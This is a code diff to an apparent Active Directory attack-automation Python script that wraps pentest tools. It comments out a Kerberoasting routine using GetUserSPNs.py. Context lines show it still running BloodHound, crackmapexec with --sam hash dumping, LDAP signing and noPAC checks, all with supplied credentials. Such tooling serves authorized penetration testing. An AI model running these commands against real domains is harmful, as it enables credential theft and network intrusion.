@@ -10,19 +10,17 @@ def write_to_file(content):
 
 ############## Kerberoasting ######################
 
-
-def find_and_kerberoast_objects(username, password, domain, dc_ip):
+# Commenting out the kerberoast function
+"""def find_and_kerberoast_objects(username, password, domain, dc_ip):
     try:
         cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         write_to_file(result.stdout)  # Save standard output
         write_to_file(result.stderr)  # Save error output if any
     except Exception as e:
-        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")
-
+        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")"""
 
 ############## BloodHound Enumeration ######################
-
 
 def bloodhound(username, password, domain, dc_ip):
     try:
@@ -36,7 +34,6 @@ def bloodhound(username, password, domain, dc_ip):
 
 ############## SMB Enumeration ######################
 
-
 def crackmapexec(username, domain, password, scope):
     try:
         cmd = f"crackmapexec smb {scope} -u {username} -d {domain} -p {password} --sam"
@@ -48,7 +45,6 @@ def crackmapexec(username, domain, password, scope):
 
 
 ############## Additional Reconnaissance ######################
-
 
 def ldapSigning(username, password, domain, dc_ip):
     try:
@@ -102,7 +98,6 @@ def noPAC(username, password, domain, dc_ip):
 
 ############## Main Function for Combined Attacks ######################
 
-
 def main(arguments=None):
     parser = argparse.ArgumentParser("AD_intrec_Combined")
     parser.add_argument("-u", "--username", help="Username for log in.")
@@ -137,13 +132,8 @@ def main(arguments=None):
         args.scope = input("Enter IP range to scan: ")
 
     print("*" * 40)
-    print("Kerberoasting and BloodHound Enumeration")
+    print("BloodHound Enumeration")
     print("*" * 40)
-
-    print("find_and_kerberoast_objects:")
-    print("#" * 40)
-    find_and_kerberoast_objects(args.username, args.password, args.domain, args.dc_ip)
-    print("Done collecting kerberoast_objects information.")
 
     print("Bloodhound Findings")
     print("#" * 40)
